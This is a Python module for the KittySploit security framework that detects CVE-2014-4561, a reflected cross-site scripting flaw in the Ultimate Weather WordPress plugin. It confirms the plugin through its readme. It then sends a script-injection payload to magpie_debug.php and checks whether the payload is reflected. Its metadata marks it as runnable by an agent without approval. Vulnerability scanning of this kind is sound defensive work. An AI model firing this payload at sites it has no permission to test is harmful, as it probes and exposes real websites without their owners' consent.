#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""The ultimate-weather plugin 1."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Ultimate Weather Plugin <= 1.0 - Cross-Site Scripting Detection',
        'description': 'The ultimate-weather plugin 1.0 for WordPress contains a cross-site scripting vulnerability.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve2014', 'cve', 'wordpress', 'wp-plugin', 'xss', 'weather', 'wpscan', 'unauth', 'ultimate-weather_project', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://wpscan.com/vulnerability/5c358ef6-8059-4767-8bcb-418a45b2352d',
            'https://nvd.nist.gov/vuln/detail/CVE-2014-4561',
            'http://codevigilant.com/disclosure/wp-plugin-ultimate-weather-plugin-a3-cross-site-scripting-xss/',
            'https://github.com/ARPSyndicate/kenzer-templates',
        ],
        'cve': 'CVE-2014-4561',
    }

    def run(self):
        path = '/wp-content/plugins/ultimate-weather-plugin/readme.txt'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_all = ('Ultimate Weather', 'Tags:',)
        if not (all(m in body for m in body_all)):
            return False
        path = '/wp-content/plugins/ultimate-weather-plugin/magpierss/scripts/magpie_debug.php?url=%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_any = ('"><script>alert(document.domain)</script>',)
        header_any = ('text/html',)
        if (any(m in body for m in body_any)) and (any(m in headers for m in header_any)):
            self.set_info(severity='medium', reason='Ultimate Weather Plugin <= 1.0 - Cross-Site Scripting detected', path=path)
            return True
        return False

